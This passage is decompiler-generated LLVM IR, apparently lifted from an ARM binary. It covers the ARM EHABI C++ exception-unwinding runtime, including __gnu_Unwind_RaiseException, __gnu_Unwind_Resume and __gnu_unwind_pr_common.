  br i1 %v7_1855c, label %dec_label_pc_18568, label %dec_label_pc_18564

dec_label_pc_18564:                               ; preds = %entry, %dec_label_pc_18534.dec_label_pc_18520_crit_edge, %dec_label_pc_1855c
  %v0_18564 = call i32 @abort()
  store i32 %v0_18564, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18568

dec_label_pc_18568:                               ; preds = %dec_label_pc_1855c, %dec_label_pc_18564
  %v0_18568 = load i32, i32* @r5, align 4
  %v1_18568 = add i32 %v0_18568, 4
  store i32 %v1_18568, i32* %r0.global-to-local, align 4
  %v1_1856c = inttoptr i32 %v1_18568 to i32*
  %v2_1856c = call i32 @__restore_core_regs(i32* %v1_1856c)
  store i32 %v2_1856c, i32* %r0.global-to-local, align 4
  ret void

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 3, 7, 9, 8, 5, 6, 2, 1, 0 }
  uselistorder label %dec_label_pc_18568, { 1, 0 }
  uselistorder label %dec_label_pc_18564, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18534, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %entry_vrs, i32* %r1.global-to-local, align 4
  %v1_18570 = add i32 %ucbp, 20
  %v2_18570 = inttoptr i32 %v1_18570 to i32*
  %v3_18570 = load i32, i32* %v2_18570, align 4
  %v1_18578 = load i32, i32* %r1.global-to-local, align 4
  %v2_18578 = add i32 %v1_18578, 64
  %v3_18578 = inttoptr i32 %v2_18578 to i32*
  store i32 %v3_18570, i32* %v3_18578, align 4
  %v1_1857c = add i32 %ucbp, 12
  %v2_1857c = inttoptr i32 %v1_1857c to i32*
  %v3_1857c = load i32, i32* %v2_1857c, align 4
  %v2_18580 = icmp eq i32 %v3_1857c, 0
  store i32 %ucbp, i32* @r4, align 4
  %v0_1858c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_1858c, i32* @r5, align 4
  br i1 %v2_18580, label %dec_label_pc_18594, label %dec_label_pc_185d0

dec_label_pc_18594:                               ; preds = %entry
  store i32 %ucbp, i32* %r1.global-to-local, align 4
  %v1_185a0 = add i32 %ucbp, 16
  %v2_185a0 = inttoptr i32 %v1_185a0 to i32*
  %v3_185a0 = load i32, i32* %v2_185a0, align 4
  call void @__pseudo_branch(i32 %v3_185a0)
  br i1 false, label %dec_label_pc_185c8, label %dec_label_pc_185b4

dec_label_pc_185b4:                               ; preds = %dec_label_pc_18594
  call void @__pseudo_cond_branch(i1 true, i32 ptrtoint (i32* @global_var_13388.530 to i32))
  %v0_185bc = load i32, i32* @r4, align 4
  %v0_185c0 = load i32, i32* @r5, align 4
  store i32 %v0_185c0, i32* %r1.global-to-local, align 4
  call void @unwind_phase2(i32 %v0_185bc, i32 %v0_185c0)
  br label %dec_label_pc_185c8

dec_label_pc_185c8:                               ; preds = %dec_label_pc_18594, %dec_label_pc_185b4
  %v0_185c8 = load i32, i32* @r5, align 4
  %v1_185c8 = add i32 %v0_185c8, 4
  %v1_185cc = inttoptr i32 %v1_185c8 to i32*
  %v2_185cc = call i32 @__restore_core_regs(i32* %v1_185cc)
  %v1_185d4.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_185d0

dec_label_pc_185d0:                               ; preds = %entry, %dec_label_pc_185c8
  %v1_185d4 = phi i32 [ %v0_1858c, %entry ], [ %v1_185d4.pre, %dec_label_pc_185c8 ]
  %v3_185d4 = call i32 @unwind_phase2_forced(i32 1, i32 %v1_185d4, i32 1)
  %v0_185d8 = call i32 @abort()
  ret i32 %v0_185d8

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder i32 ()* @abort, { 6, 5, 4, 3, 2, 1, 9, 8, 10, 7, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 44, 45, 46, 47, 48, 50, 20, 17, 18, 19, 13, 14, 15, 21, 22, 16, 4, 5, 6, 7, 8, 9, 10, 11, 12, 31, 55, 59, 58, 57, 51, 52, 39, 40, 41, 42, 43, 53, 54, 56, 34, 35, 49, 32, 36, 33, 26, 27, 23, 24, 25, 0, 28, 29, 30, 37, 38, 1, 2, 3 }
  uselistorder i1 true, { 0, 1, 2, 3, 96, 139, 4, 140, 141, 142, 143, 5, 82, 115, 144, 6, 81, 145, 7, 80, 146, 147, 148, 149, 8, 150, 116, 9, 84, 151, 10, 83, 152, 153, 11, 154, 155, 156, 12, 157, 158, 13, 159, 14, 118, 160, 161, 117, 162, 163, 15, 85, 16, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 18, 87, 19, 174, 175, 176, 20, 86, 177, 21, 17, 178, 179, 22, 180, 181, 182, 23, 183, 184, 185, 186, 187, 24, 25, 119, 26, 27, 28, 138, 88, 188, 189, 89, 190, 121, 191, 192, 30, 193, 194, 31, 90, 196, 29, 197, 195, 198, 120, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 92, 43, 44, 45, 46, 47, 98, 200, 218, 79, 93, 100, 204, 103, 102, 101, 48, 51, 199, 91, 99, 201, 202, 203, 124, 205, 206, 207, 208, 209, 52, 53, 210, 211, 212, 213, 125, 214, 215, 49, 50, 216, 217, 123, 122, 54, 55, 56, 219, 57, 58, 104, 105, 111, 106, 112, 107, 110, 220, 108, 114, 221, 59, 222, 60, 223, 126, 127, 224, 128, 129, 225, 130, 131, 61, 62, 226, 132, 133, 63, 64, 227, 134, 135, 65, 66, 228, 136, 137, 67, 68, 97, 229, 230, 113, 231, 69, 109, 70, 71, 94, 72, 73, 95, 74, 75, 76, 77, 78 }
  uselistorder i32 %ucbp, { 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_185d0, { 1, 0 }
  uselistorder label %dec_label_pc_185c8, { 1, 0 }
}

define i32 @__gnu_Unwind_RaiseException(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %saved_vrs_-320 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_185dc = load i32, i32* @r4, align 4
  store i32 %v3_185dc, i32* %stack_var_-16, align 4
  %v6_185dc = load i32, i32* @r5, align 4
  %v9_185dc = load i32, i32* @r6, align 4
  %v12_185dc = load i32, i32* @lr, align 4
  %v1_185e0 = add i32 %entry_vrs, 60
  %v2_185e0 = inttoptr i32 %v1_185e0 to i32*
  %v3_185e0 = load i32, i32* %v2_185e0, align 4
  %v2_185e4 = add i32 %entry_vrs, 64
  %v3_185e4 = inttoptr i32 %v2_185e4 to i32*
  store i32 %v3_185e0, i32* %v3_185e4, align 4
  store i32 %entry_vrs, i32* @r6, align 4
  store i32 %ucbp, i32* @r5, align 4
  %v11_18614 = load i32, i32* %v3_185e4, align 4
  store i32 -1, i32* %saved_vrs_-320, align 4
  %v2_1862c = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_18614)
  %v2_18630 = icmp eq i32 %v2_1862c, 0
  br i1 %v2_18630, label %dec_label_pc_18638, label %dec_label_pc_1866c

dec_label_pc_18638:                               ; preds = %entry
  %v0_18638 = load i32, i32* @r5, align 4
  %v1_18640 = add i32 %v0_18638, 16
  %v2_18640 = inttoptr i32 %v1_18640 to i32*
  %v3_18640 = load i32, i32* %v2_18640, align 4
  call void @__pseudo_branch(i32 %v3_18640)
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_18658 = load i32, i32* %saved_vrs_-320, align 4
  %v1_1865c = urem i32 %v2_18658, 2
  %v2_1865c = icmp eq i32 %v1_1865c, 0
  br i1 %v2_1865c, label %dec_label_pc_1867c, label %dec_label_pc_18664

dec_label_pc_18664:                               ; preds = %dec_label_pc_18638, %dec_label_pc_1867c
  %v0_18664 = phi i1 [ false, %dec_label_pc_18638 ], [ %phitmp, %dec_label_pc_1867c ]
  br i1 %v0_18664, label %dec_label_pc_18688, label %dec_label_pc_1866c

dec_label_pc_1866c:                               ; preds = %entry, %dec_label_pc_18664
  %v2_18674 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18674, i32* @r4, align 4
  store i32 %v6_185dc, i32* @r5, align 4
  store i32 %v9_185dc, i32* @r6, align 4
  store i32 %v12_185dc, i32* @lr, align 4
  ret i32 9

dec_label_pc_1867c:                               ; preds = %dec_label_pc_18638
  %v2_1867c = ptrtoint i32* %stack_var_-248 to i32
  store i32 %v2_1867c, i32* @r0, align 4
  %v1_18680 = call i32 @__gnu_Unwind_Restore_VFP(i32 %v2_1867c)
  %v0_18664.pre = load i32, i32* %r4.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_18664.pre, 6
  br label %dec_label_pc_18664

dec_label_pc_18688:                               ; preds = %dec_label_pc_18664
  %v0_18688 = load i32, i32* @r5, align 4
  %v0_1868c = load i32, i32* @r6, align 4
  call void @unwind_phase2(i32 %v0_18688, i32 %v0_1868c)
  ret i32 ptrtoint (i32* @0 to i32)

; uselistorder directives
  uselistorder void (i32, i32)* @unwind_phase2, { 1, 0 }
  uselistorder i32 (i32, i32)* @get_eit_entry, { 3, 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1866c, { 1, 0 }
  uselistorder label %dec_label_pc_18664, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %v1_18694 = add i32 %ucbp, 12
  %v2_18694 = inttoptr i32 %v1_18694 to i32*
  %v3_18694 = load i32, i32* %v2_18694, align 4
  %v2_18698 = icmp eq i32 %v3_18694, 0
  br i1 %v2_18698, label %dec_label_pc_186a0, label %dec_label_pc_186a4

dec_label_pc_186a0:                               ; preds = %entry
  %v2_186a0 = call i32 @__gnu_Unwind_RaiseException(i32 0, i32 %entry_vrs)
  br label %dec_label_pc_186a4

dec_label_pc_186a4:                               ; preds = %entry, %dec_label_pc_186a0
  %v1_186a4 = add i32 %entry_vrs, 60
  %v2_186a4 = inttoptr i32 %v1_186a4 to i32*
  %v3_186a4 = load i32, i32* %v2_186a4, align 4
  %v2_186ac = add i32 %entry_vrs, 64
  %v3_186ac = inttoptr i32 %v2_186ac to i32*
  store i32 %v3_186a4, i32* %v3_186ac, align 4
  %v3_186b0 = call i32 @unwind_phase2_forced(i32 0, i32 %entry_vrs, i32 0)
  ret i32 %v3_186b0

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @unwind_phase2_forced, { 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_186a4, { 1, 0 }
}

define i32 @_Unwind_VRS_Pop(i32 %context, i32 %regclass, i32 %discriminator, i32 %representation) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %regclass, 5
  br i1 %tmp, label %bb, label %dec_label_pc_18710

bb:                                               ; preds = %entry
  %v7_186c8 = mul i32 %regclass, 4
  %v8_186c8 = add i32 %v7_186c8, ptrtoint (i32* @global_var_186d0.681 to i32)
  call void @__pseudo_branch(i32 %v8_186c8)
  br label %dec_label_pc_18710

dec_label_pc_18710:                               ; preds = %bb, %entry
  ret i32 2

; uselistorder directives
  uselistorder i32 %regclass, { 1, 0 }
}

define i32 @__gnu_unwind_pr_common(i32 %state, i32 %ucbp, i32 %context, i32 %id) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %context, i32* %r2.global-to-local, align 4
  store i32 %state, i32* %r0.global-to-local, align 4
  %forced_unwind_-44 = alloca i32, align 4
  %uws_-60 = alloca %anon_struct_4, align 8
  %stack_var_-48 = alloca i32, align 4
  %v3_187f8 = load i32, i32* @r4, align 4
  %v6_187f8 = load i32, i32* @r5, align 4
  %v2_18808 = icmp eq i32 %id, 0
  store i32 %ucbp, i32* @r8, align 4
  %v1_18810 = add i32 %ucbp, 76
  %v2_18810 = inttoptr i32 %v1_18810 to i32*
  %v3_18810 = load i32, i32* %v2_18810, align 4
  %v1_1881c = inttoptr i32 %v3_18810 to i32*
  %v2_1881c = load i32, i32* %v1_1881c, align 4
  store i32 %v2_1881c, i32* @lr, align 4
  %v4_1881c = add i32 %v3_18810, 4
  store i32 %context, i32* %fp.global-to-local, align 4
  %v1_18828 = urem i32 %state, 4
  store i32 %v1_18828, i32* %r2.global-to-local, align 4
  %v1_1882c = and i32 %state, 8
  store i32 %v1_1882c, i32* %r0.global-to-local, align 4
  %v4_1883c = getelementptr inbounds %anon_struct_4, %anon_struct_4* %uws_-60, i32 0, i32 0
  store i32 %v2_1881c, i32* %v4_1883c, align 8
  br i1 %v2_18808, label %dec_label_pc_1884c, label %dec_label_pc_18b28

dec_label_pc_1884c:                               ; preds = %entry
  %v3_1884c = mul i32 %v2_1881c, 256
  store i32 %v3_1884c, i32* %v4_1883c, align 8
  store i32 3, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18864

dec_label_pc_18864:                               ; preds = %dec_label_pc_18b28, %dec_label_pc_1884c
  %v0_18888647090 = phi i32 [ %v2_18b40, %dec_label_pc_18b28 ], [ %v4_1881c, %dec_label_pc_1884c ]
  store i32 %v1_18828, i32* %r2.global-to-local, align 4
  %v1_18868 = add i32 %ucbp, 80
  %v2_18868 = inttoptr i32 %v1_18868 to i32*
  %v3_18868 = load i32, i32* %v2_18868, align 4
  %v7_1886c = icmp eq i32 %v1_18828, 2
  br i1 %v7_1886c, label %bb, label %bb148

bb:                                               ; preds = %dec_label_pc_18864
  %v2_18870 = add i32 %ucbp, 56
  %v3_18870 = inttoptr i32 %v2_18870 to i32*
  %v4_18870 = load i32, i32* %v3_18870, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_18864, %bb
  %v0_188886470 = phi i32 [ %v0_18888647090, %dec_label_pc_18864 ], [ %v4_18870, %bb ]
  %v1_18874 = urem i32 %v3_18868, 2
  %v2_18874 = icmp eq i32 %v1_18874, 0
  br i1 %v2_18874, label %dec_label_pc_18888.preheader, label %bb149

bb149:                                            ; preds = %bb148
  br label %dec_label_pc_18948

dec_label_pc_18888.preheader:                     ; preds = %bb148
  %v1_188886571 = inttoptr i32 %v0_188886470 to i32*
  %v2_188886672 = load i32, i32* %v1_188886571, align 4
  %v2_1888c6874 = icmp eq i32 %v2_188886672, 0
  br i1 %v2_1888c6874, label %dec_label_pc_18948, label %dec_label_pc_18894.preheader.lr.ph.lr.ph

dec_label_pc_18894.preheader.lr.ph.lr.ph:         ; preds = %dec_label_pc_18888.preheader
  %v7_18898 = icmp eq i32 %id, 2
  %v2_18924 = icmp eq i32 %v1_18828, 0
  %v2_18af0 = ptrtoint i32* %forced_unwind_-44 to i32
  %v3_18a0c = icmp eq i32 %v1_1882c, 0
  br label %dec_label_pc_18894.preheader.lr.ph

dec_label_pc_18894.preheader.lr.ph:               ; preds = %dec_label_pc_18894.preheader.lr.ph.lr.ph, %dec_label_pc_18b5c
  %v1_188a496 = phi i32 [ %v2_188886672, %dec_label_pc_18894.preheader.lr.ph.lr.ph ], [ %v2_1888866, %dec_label_pc_18b5c ]
  %v1_188a093 = phi i32 [ %v0_188886470, %dec_label_pc_18894.preheader.lr.ph.lr.ph ], [ %v2_18b60, %dec_label_pc_18b5c ]
  %stack_var_-76.2.ph3175 = phi i32 [ 0, %dec_label_pc_18894.preheader.lr.ph.lr.ph ], [ %stack_var_-76.4, %dec_label_pc_18b5c ]
  br label %dec_label_pc_18894.preheader

dec_label_pc_18894.preheader:                     ; preds = %dec_label_pc_18894.preheader.lr.ph, %dec_label_pc_18b20
  %v1_188a495 = phi i32 [ %v1_188a496, %dec_label_pc_18894.preheader.lr.ph ], [ %v2_18888, %dec_label_pc_18b20 ]
  %v1_188a092 = phi i32 [ %v1_188a093, %dec_label_pc_18894.preheader.lr.ph ], [ %v1_18b20, %dec_label_pc_18b20 ]
  br label %dec_label_pc_18894

dec_label_pc_18894:                               ; preds = %dec_label_pc_18894.preheader, %dec_label_pc_18938
  %v1_188a4 = phi i32 [ %v1_188a495, %dec_label_pc_18894.preheader ], [ %v2_1893c, %dec_label_pc_18938 ]
  %v1_188b8 = phi i32 [ %v1_188a092, %dec_label_pc_18894.preheader ], [ %v1_18938, %dec_label_pc_18938 ]
  store i32 %id, i32* %r2.global-to-local, align 4
  br i1 %v7_18898, label %bb151, label %.thread16

bb151:                                            ; preds = %dec_label_pc_18894
  %v2_1889c = add i32 %v1_188b8, 4
  %v3_1889c = inttoptr i32 %v2_1889c to i32*
  %v4_1889c = load i32, i32* %v3_1889c, align 4
  store i32 %v4_1889c, i32* @r5, align 4
  store i32 %v1_188a4, i32* @r6, align 4
  %v0_188a8109 = load i32, i32* @r8, align 4
  %v1_188a8110 = add i32 %v0_188a8109, 72
  %v2_188a8111 = inttoptr i32 %v1_188a8110 to i32*
  %v3_188a8112 = load i32, i32* %v2_188a8111, align 4
  store i32 %v3_188a8112, i32* @lr, align 4
  %v2_188b4 = add i32 %v1_188b8, 8
  br label %bb152

.thread16:                                        ; preds = %dec_label_pc_18894
  %v2_188a0 = add i32 %v1_188b8, 2
  %v3_188a0 = inttoptr i32 %v2_188a0 to i16*
  %v4_188a0 = load i16, i16* %v3_188a0, align 2
  %v5_188a0 = zext i16 %v4_188a0 to i32
  store i32 %v5_188a0, i32* @r5, align 4
  %v0_188a8 = load i32, i32* @r8, align 4
  %v1_188a8 = add i32 %v0_188a8, 72
  %v2_188a8 = inttoptr i32 %v1_188a8 to i32*
  %v3_188a8 = load i32, i32* %v2_188a8, align 4
  store i32 %v3_188a8, i32* @lr, align 4
  %v2_188b0 = inttoptr i32 %v1_188b8 to i16*
  %v3_188b0 = load i16, i16* %v2_188b0, align 2
  %v4_188b0 = zext i16 %v3_188b0 to i32
  store i32 %v4_188b0, i32* @r6, align 4
  %v2_188b8 = add i32 %v1_188b8, 4
  br label %bb152

bb152:                                            ; preds = %bb151, %.thread16
  %storemerge121 = phi i32 [ %v2_188b8, %.thread16 ], [ %v2_188b4, %bb151 ]
  %v3_188a8115 = phi i32 [ %v3_188a8, %.thread16 ], [ %v3_188a8112, %bb151 ]
  %v0_188c0113 = phi i32 [ %v5_188a0, %.thread16 ], [ %v4_1889c, %bb151 ]
  store i32 %storemerge121, i32* @r7, align 4
  %v1_188c0 = and i32 %v0_188c0113, -2
  %v2_188c4 = add i32 %v1_188c0, %v3_188a8115
  store i32 %v2_188c4, i32* @r4, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_188d4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_188d4, i32* %r0.global-to-local, align 4
  %v5_188e0 = call i32 @_Unwind_VRS_Get(i32 %v0_188d4, i32 15, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_188e0, i32* %r0.global-to-local, align 4
  %v3_188e4 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_188e4, i32* %r2.global-to-local, align 4
  %v0_188e8 = load i32, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_188e8, %v3_188e4
  br i1 %tmp, label %._crit_edge, label %dec_label_pc_188f4

._crit_edge:                                      ; preds = %bb152
  %v0_1890c.pre = load i32, i32* @r6, align 4
  br label %bb154

dec_label_pc_188f4:                               ; preds = %bb152
  %v0_188f4 = load i32, i32* @r6, align 4
  %v1_188f4 = and i32 %v0_188f4, -2
  %v2_188f8 = add i32 %v1_188f4, %v0_188e8
  %v3_188fc = icmp ult i32 %v3_188e4, %v2_188f8
  br i1 %v3_188fc, label %.thread20, label %bb153

bb153:                                            ; preds = %dec_label_pc_188f4
  br label %bb154

.thread20:                                        ; preds = %dec_label_pc_188f4
  br label %bb154

bb154:                                            ; preds = %bb153, %._crit_edge, %.thread20
  %v0_1890c = phi i32 [ %v0_1890c.pre, %._crit_edge ], [ %v0_188f4, %bb153 ], [ %v0_188f4, %.thread20 ]
  %v0_18ab4 = phi i32 [ 0, %._crit_edge ], [ 0, %bb153 ], [ 1, %.thread20 ]
  %v0_18908 = load i32, i32* @r5, align 4
  %v1_1890c = urem i32 %v0_1890c, 2
  %v1_18908 = mul i32 %v0_18908, 2
  %v3_18910 = and i32 %v1_18908, 2
  %v4_18910 = or i32 %v3_18910, %v1_1890c
  store i32 %v4_18910, i32* %r2.global-to-local, align 4
  %v7_18914 = icmp eq i32 %v4_18910, 1
  br i1 %v7_18914, label %dec_label_pc_18aa8, label %dec_label_pc_1891c

dec_label_pc_1891c:                               ; preds = %bb154
  %v2_18914 = icmp eq i32 %v4_18910, 0
  br i1 %v2_18914, label %dec_label_pc_18920, label %dec_label_pc_189d0

dec_label_pc_18920:                               ; preds = %dec_label_pc_1891c
  store i32 %v1_18828, i32* %r2.global-to-local, align 4
  br i1 %v2_18924, label %.thread, label %bb155

.thread:                                          ; preds = %dec_label_pc_18920
  %v0_18938119 = load i32, i32* @r7, align 4
  br label %dec_label_pc_18938

bb155:                                            ; preds = %dec_label_pc_18920
  %v2_18930 = icmp eq i32 %v0_18ab4, 0
  %v0_18938 = load i32, i32* @r7, align 4
  br i1 %v2_18930, label %dec_label_pc_18938, label %dec_label_pc_18cb0

dec_label_pc_18938:                               ; preds = %.thread, %bb155
  %v0_18938120 = phi i32 [ %v0_18938119, %.thread ], [ %v0_18938, %bb155 ]
  %v1_18938 = add i32 %v0_18938120, 4
  %v1_1893c = inttoptr i32 %v1_18938 to i32*
  %v2_1893c = load i32, i32* %v1_1893c, align 4
  %v2_18940 = icmp eq i32 %v2_1893c, 0
  br i1 %v2_18940, label %dec_label_pc_18948, label %dec_label_pc_18894

dec_label_pc_18948:                               ; preds = %dec_label_pc_18b5c, %dec_label_pc_18b20, %dec_label_pc_18938, %dec_label_pc_18888.preheader, %bb149
  %stack_var_-76.3 = phi i32 [ 0, %bb149 ], [ 0, %dec_label_pc_18888.preheader ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18938 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18b20 ], [ %stack_var_-76.4, %dec_label_pc_18b5c ]
  %v0_18948 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18948, i32* %r0.global-to-local, align 4
  %tmp156 = bitcast %anon_struct_4* %uws_-60 to %anon_struct_13*
  %v4_18950 = call i32 @__gnu_unwind_execute(i32 %v0_18948, %anon_struct_13* %tmp156)
  store i32 %v4_18950, i32* %r0.global-to-local, align 4
  store i32 %v4_18950, i32* %r5.global-to-local, align 4
  %v2_18954 = icmp eq i32 %v4_18950, 0
  br i1 %v2_18954, label %dec_label_pc_1895c, label %dec_label_pc_189d8

dec_label_pc_1895c:                               ; preds = %dec_label_pc_18948
  store i32 %stack_var_-76.3, i32* %r2.global-to-local, align 4
  %v2_18960 = icmp eq i32 %stack_var_-76.3, 0
  br i1 %v2_18960, label %bb157, label %dec_label_pc_1896c

bb157:                                            ; preds = %dec_label_pc_1895c
  store i32 8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_189dc

dec_label_pc_1896c:                               ; preds = %dec_label_pc_1895c
  %v2_1896c = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1896c, i32* %r4.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_1897c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1897c, i32* %r0.global-to-local, align 4
  %tmp158 = bitcast i32* %stack_var_-48 to i8*
  %v7_18984 = call i32 @_Unwind_VRS_Get(i32 %v0_1897c, i32 0, i32 15, i32 0, i8* %tmp158)
  %v0_18988 = load i32, i32* %r5.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 %v0_1897c, i32* %r0.global-to-local, align 4
  %v5_1899c = call i32 @_Unwind_VRS_Set(i32 %v0_1897c, i32 %v0_18988, i32 14, i32 %v0_18988, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1899c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %r2.global-to-local, align 4
  %v4_189a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 32) to i32*), align 4
  %v0_189ac = load i32, i32* %r5.global-to-local, align 4
  %v0_189b0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_189b0, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v4_189a8, i32* %stack_var_-48, align 4
  %v5_189c4 = call i32 @_Unwind_VRS_Set(i32 %v0_189b0, i32 %v0_189ac, i32 15, i32 %v0_189ac, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_189dc

dec_label_pc_189d0:                               ; preds = %dec_label_pc_1891c
  %v7_189d0 = icmp eq i32 %v4_18910, 2
  br i1 %v7_189d0, label %dec_label_pc_189e8, label %dec_label_pc_189d8

dec_label_pc_189d8:                               ; preds = %dec_label_pc_189d0, %dec_label_pc_18abc, %dec_label_pc_18948, %dec_label_pc_18cb0
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_189dc

dec_label_pc_189dc:                               ; preds = %bb157, %dec_label_pc_18ce8, %dec_label_pc_18c78, %bb166, %dec_label_pc_1896c, %dec_label_pc_189d8
  %v1_189e4 = phi i32 [ 8, %bb157 ], [ 7, %dec_label_pc_18ce8 ], [ %v1_189e4.pre, %dec_label_pc_18c78 ], [ 7, %bb166 ], [ 7, %dec_label_pc_1896c ], [ 9, %dec_label_pc_189d8 ]
  store i32 %v3_187f8, i32* %r4.global-to-local, align 4
  store i32 %v6_187f8, i32* %r5.global-to-local, align 4
  ret i32 %v1_189e4

dec_label_pc_189e8:                               ; preds = %dec_label_pc_189d0
  store i32 %v1_18828, i32* %r2.global-to-local, align 4
  %v0_189ec = load i32, i32* @r7, align 4
  %v1_189ec = inttoptr i32 %v0_189ec to i32*
  %v2_189ec = load i32, i32* %v1_189ec, align 4
  %tmp206 = bitcast i32 %v2_189ec to float
  %tmp207 = call float @fabsf(float %tmp206)
  %v1_189f4 = bitcast float %tmp207 to i32
  store i32 %v1_189f4, i32* @sl, align 4
  br i1 %v2_18924, label %dec_label_pc_189fc, label %dec_label_pc_18b68

dec_label_pc_189fc:                               ; preds = %dec_label_pc_189e8
  %v2_189fc = icmp eq i32 %v0_18ab4, 0
  br i1 %v2_189fc, label %dec_label_pc_18b50, label %dec_label_pc_18a04

dec_label_pc_18a04:                               ; preds = %dec_label_pc_189fc
  %v2_18a08 = icmp eq i32 %v1_189f4, 0
  br i1 %v2_18a08, label %dec_label_pc_18a14.thread, label %bb159

dec_label_pc_18a14.thread:                        ; preds = %dec_label_pc_18a04
  br label %dec_label_pc_18c78

bb159:                                            ; preds = %dec_label_pc_18a04
  br i1 %v3_18a0c, label %dec_label_pc_18a1c, label %dec_label_pc_18b50

dec_label_pc_18a1c:                               ; preds = %bb159
  %v1_18a1c = add i32 %v0_189ec, 4
  store i32 %v1_18a1c, i32* @r6, align 4
  store i32 100, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_18a2c = load i32, i32* @r8, align 4
  %v1_18a2c = add i32 %v0_18a2c, 88
  store i32 %v1_18a2c, i32* %sb.global-to-local, align 4
  store i32 %v1_18a1c, i32* @r4, align 4
  br label %dec_label_pc_18a50

dec_label_pc_18a40:                               ; preds = %bb161
  %v1_18a40 = add i32 %v0_18a40, 1
  store i32 %v1_18a40, i32* @r5, align 4
  %v1_18a44 = load i32, i32* @sl, align 4
  %v9_18a44 = icmp eq i32 %v1_18a40, %v1_18a44
  %v0_18a48 = load i32, i32* @r4, align 4
  %v1_18a48 = add i32 %v0_18a48, 4
  store i32 %v1_18a48, i32* @r4, align 4
  br i1 %v9_18a44, label %dec_label_pc_18c78, label %dec_label_pc_18a40.dec_label_pc_18a50_crit_edge

dec_label_pc_18a40.dec_label_pc_18a50_crit_edge:  ; preds = %dec_label_pc_18a40
  %v0_18a5c.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_18a50

dec_label_pc_18a50:                               ; preds = %dec_label_pc_18a40.dec_label_pc_18a50_crit_edge, %dec_label_pc_18a1c
  %v0_18a5c = phi i32 [ %v0_18a5c.pre, %dec_label_pc_18a40.dec_label_pc_18a50_crit_edge ], [ %v1_18a2c, %dec_label_pc_18a1c ]
  %v1_18a60 = phi i32 [ %v1_18a48, %dec_label_pc_18a40.dec_label_pc_18a50_crit_edge ], [ %v1_18a1c, %dec_label_pc_18a1c ]
  %v1_18a50 = inttoptr i32 %v1_18a60 to i32*
  %v2_18a50 = load i32, i32* %v1_18a50, align 4
  %v2_18a54 = icmp eq i32 %v2_18a50, 0
  store i32 %v0_18a5c, i32* %forced_unwind_-44, align 4
  br i1 %v2_18a54, label %bb161, label %bb160

bb160:                                            ; preds = %dec_label_pc_18a50
  br label %bb161

bb161:                                            ; preds = %dec_label_pc_18a50, %bb160
  %v0_18a64 = load i32, i32* @r8, align 4
  store i32 %v0_18a64, i32* %r0.global-to-local, align 4
  store i32 %v2_18af0, i32* %r2.global-to-local, align 4
  %v4_18a74 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 100) to i32*), align 4
  store i32 100992, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_18a74)
  %v0_18a80 = load i32, i32* %r0.global-to-local, align 4
  %v2_18a80 = icmp eq i32 %v0_18a80, 0
  %v0_18a40 = load i32, i32* @r5, align 4
  br i1 %v2_18a80, label %dec_label_pc_18a40, label %dec_label_pc_18a88

